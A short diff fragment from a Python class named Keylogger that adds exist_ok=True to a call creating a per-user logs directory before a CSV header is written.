@@ -73,7 +73,8 @@ class Keylogger:
                     LOGS_DIR,
                     self.user_id,
                 )
-            )
+            ),
+            exist_ok=True
         )
         self.csv_writer.write_header(
             os.path.join(
